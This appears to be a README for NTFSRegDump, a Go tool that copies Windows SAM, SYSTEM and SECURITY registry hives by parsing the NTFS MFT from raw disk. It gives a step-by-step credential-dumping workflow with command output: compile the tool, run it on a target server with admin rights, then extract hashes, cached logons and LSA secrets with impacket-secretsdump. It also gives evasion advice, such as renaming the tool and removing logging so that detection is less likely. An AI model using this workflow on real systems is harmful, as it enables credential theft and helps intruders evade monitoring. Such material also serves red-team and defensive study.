### NTFSRegDump
---------------------------------------
A Windows registry dumper (written in GO) that operates by reading raw disk sectors and parsing the NTFS Master File Table (MFT) to locate and extract registry hives (SAM, SYSTEM, and SECURITY). 
It avoids using native utilities like 'reg save' and 'vssadmin', reducing the likelihood of detection by security monitoring tools.  
This tool is a slightly modified version of the GitHub project 'SilentSAM', which itself relies on the GitHub project 'gomft' (an NTFS MFT parser written in Go).

DISCLAIMER: During testing, this tool consistently consumed a high amount of CPU (around 70%), which may not be ideal depending on your environment...

#### USAGE
- STEP 1 - Compile the GO source code.  
<i/>OPSEC advice: Rename the tool, functions, etc. and remove verbose logging messages in the source code before compiling it.</i>
```
┌──(kali㉿kali)-[~/Documents/Tools/NTFSRegDump]
└─$ GOOS=windows go build NTFSRegDump.go
```

- STEP 2 - On your target Windows machine, run the tool 'NTFSRegDump.exe' (with local admin rights) to copy the registry hives SAM, SYSTEM and SECURITY.
```
Example on a Windows server 2022:
---------------------------------

C:\Users\Administrator\Downloads> NTFSRegDump.exe
Usage: NTFSRegDump.exe system-output-file security-output-file sam-output-file

C:\Users\Administrator\Downloads> NTFSRegDump.exe system.dmp security.dmp sam.dmp
2025/12/29 06:45:46 Listing available volumes...
2025/12/29 06:45:46 Volume \\?\Volume{ff658440-0000-0000-0000-100000000000} isn't the system volume, keep processing
2025/12/29 06:45:46 Volume \\?\Volume{ff658440-0000-0000-0000-500600000000} contains the Windows directory.
2025/12/29 06:45:46 MFT starts at byte offset: 3221225472
2025/12/29 06:45:46 Starting to parse MFT records...
2025/12/29 06:46:48 Found SYSTEM in MFT record
2025/12/29 06:46:56 SYSTEM file saved to system.dmp
2025/12/29 06:46:56 MFT starts at byte offset: 3221225472
2025/12/29 06:46:56 Starting to parse MFT records...
2025/12/29 06:51:24 Found SECURITY in MFT record
2025/12/29 06:51:24 SECURITY file saved to security.dmp
2025/12/29 06:51:24 MFT starts at byte offset: 3221225472
2025/12/29 06:51:24 Starting to parse MFT records...
2025/12/29 06:51:49 Found SAM in MFT record
2025/12/29 06:51:49 Failed to extract SAM data...
2025/12/29 06:51:53 Found SAM in MFT record
2025/12/29 06:51:53 Failed to extract SAM data...
2025/12/29 06:53:09 Found SAM in MFT record
2025/12/29 06:53:09 SAM file saved to sam.dmp

C:\Users\Administrator\Downloads> dir
<SNIP>
12/29/2025  06:45 AM         2,954,752 NTFSRegDump.exe
12/29/2025  06:53 AM            49,152 sam.dmp
12/29/2025  06:51 AM            32,768 security.dmp
12/29/2025  06:46 AM        18,325,504 system.dmp
<SNIP>
```

- STEP 3 - Use 'impacket-secretsdump' to dump local SAM hashes, cached domain logon information and LSA secrets.
```
┌──(kali㉿kali)-[~/Documents/Tools/NTFSRegDump]
└─$ impacket-secretsdump -sam sam.dmp -system system.dmp -security security.dmp LOCAL
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
<SNIP>
```

#### LICENSE
GNU General Public License v3.0

